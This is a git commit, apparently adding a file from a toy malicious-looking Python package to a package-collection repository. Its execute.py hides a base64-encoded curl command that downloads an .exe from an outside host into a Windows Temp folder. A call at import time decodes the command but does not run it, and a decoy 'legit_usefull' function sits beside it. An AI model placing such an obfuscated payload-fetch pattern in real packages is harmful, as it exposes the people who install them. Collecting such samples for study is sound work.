0af7fa4db90bb6ddf564b884a721250ffdc16f6e
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-01-30 03:04:33 +0000

    Add package not-so-evil-package-spaceylad/0.0.5/not_so_evil_package_spaceylad-0.0.5.tar.gz

---
+++ packages/not-so-evil-package-spaceylad/not_so_evil_package_spaceylad-0.0.5.tar.gz/not_so_evil_package_spaceylad-0.0.5/src/not_so_evil_package_spaceylad/execute.py
@@ -0,0 +1,18 @@
+import base64
+
+def evil_func():
+    return base64.b64decode("Y3VybCAtbyBDOlxVc2Vyc1xJWFlcQXBwRGF0YVxMb2NhbFxUZW1wXGV2aWxfcHl0aG9uLmV4ZSBodHRwczovL3NwYWNleWxhZC5weXRob25hbnl3aGVyZS5jb20vc3RhdGljL2V2aWxfcHl0aG9uLmV4ZQ==").decode()
+
+
+def evil_code():
+    print("MUAHAHAHHA")
+    evil_command = evil_func()
+    return evil_command
+
+
+def legit_usefull():
+    print("Here is some legit code that is very useful! :] It is the answer of what 2 + 2 is! :D")
+    return 2 + 2
+
+
+evil_code()
